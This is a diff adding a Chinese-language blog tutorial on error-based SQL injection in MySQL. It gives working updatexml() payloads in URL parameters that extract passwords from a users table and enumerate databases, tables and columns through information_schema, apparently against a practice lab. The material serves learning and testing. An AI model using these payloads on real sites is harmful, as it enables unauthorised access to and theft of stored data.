@@ -1,0 +1,63 @@
+<hr>
+<h2 id="title-SQL报错注入技术date-2024-05-20categories-Web安全-注入漏洞-SQL注入tags-SQL注入-报错注入"><a href="#title-SQL报错注入技术date-2024-05-20categories-Web安全-注入漏洞-SQL注入tags-SQL注入-报错注入" class="headerlink" title="title: SQL报错注入技术date: 2024-05-20categories:  - Web安全  - 注入漏洞  - SQL注入tags:  - SQL注入  - 报错注入"></a>title: SQL报错注入技术<br>date: 2024-05-20<br>categories:<br>  - Web安全<br>  - 注入漏洞<br>  - SQL注入<br>tags:<br>  - SQL注入<br>  - 报错注入</h2><h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h3 id="报错注入常用的函数"><a href="#报错注入常用的函数" class="headerlink" title="报错注入常用的函数"></a>报错注入常用的函数</h3><pre><code class="language-bash">floor()
+
+extractvalue()
+
+updatexml()
+
+geometrycollection()
+
+multipoint()
+
+polygon()
+
+multipolygon()
+
+linestring()
+.。。。。。
+
+这里介绍一个案例updatexml()。
+</code></pre>
+<h3 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h3><p>MySQL提供了一个<code>updatexml()</code>​函数，当第二个参数包含特殊符号时会报错，并将第二个参数的内容显示在报错信息中。</p>
+<p>我们尝试在查询用户id的同时，使用报错函数，在地址栏输入：<code>?id=1&#39; and updatexml(1, 0x7e, 3) -- a</code>​</p>
+<p>参数2内容中的查询结果显示在数据库的报错信息中，并回显到页面。</p>
+<p><img src="/assets/image-20250519092815-g702fvt.png" alt="image"></p>
+<p>​<code>version()</code>​：返回数据库版本<code>concat()</code>​：拼接特殊符号和查询结果</p>
+<p>​<code>updatexml()</code>​函数的报错内容长度不能超过32个字符，常用的解决方式有两种：</p>
+<ol>
+<li>​<code>limit</code>​：分页</li>
+<li>​<code>substr()</code>​：截取字符</li>
+</ol>
+<hr>
+<h4 id="1-1-limit分页"><a href="#1-1-limit分页" class="headerlink" title="1.1 limit分页"></a>1.1 limit分页</h4><p>例如，已知users表中包含username和password两个字段，显示出某个password字段的数据</p>
+<pre><code class="language-bash">id=-1&#39; and updatexml(1, concat(0x7e,(select password from users limit 0,1)), 3) -- a
+</code></pre>
+<p>使用<code>group_concat(字段名)</code>​显示出最高32位字符长度，password字段的数据</p>
+<pre><code>id=-1&#39; and updatexml(1, concat(0x7e,(select group_concat(password) from users limit 0,1)), 3) -- a
+</code></pre>
+<hr>
+<h4 id="1-2-substr"><a href="#1-2-substr" class="headerlink" title="1.2 substr()"></a>1.2 substr()</h4><p>适用情况：页面有数据库报错信息</p>
+<pre><code class="language-bash">1.网站信息必须是动态的，来自数据库的报错信息。
+2.网站写死的、自定义的报错信息不算
+</code></pre>
+<p>1.判断是否报错</p>
+<p>参数中添加单&#x2F;双引号，页面报错才可进行下一步。</p>
+<pre><code>?id=1&#39; -- a
+</code></pre>
+<p>2.判断报错条件</p>
+<p>参数中添加报错函数，检查报错信息是否正常回显。</p>
+<pre><code>?id=1&#39; and updatexml(1,&#39;~&#39;,3) -- a 
+</code></pre>
+<ol start="3">
+<li>脱库</li>
+</ol>
+<pre><code>//获取所有数据库
+?id=1&#39; and updatexml(1,concat(&#39;~&#39;,substr((select group_concat(schema_name) from information_schema.schemata),1,31)),3) -- qwq 
+
+//获取所有表
+?id=1&#39; and updatexml(1,concat(&#39;~&#39;,substr((select group_concat(table_name) from information_schema.tables where table_schema =&#39;security&#39;),1,31)),3) -- qwq
+
+//获取所有字段
+?id=1&#39; and updatexml(1,concat(&#39;~&#39;,substr((select group_concat(column_name) from information_schema.columns where table_schema =&#39;security&#39; and table_name=&#39;users&#39;),1,31)),3) -- qwq
+</code></pre>
+<p>‍</p>
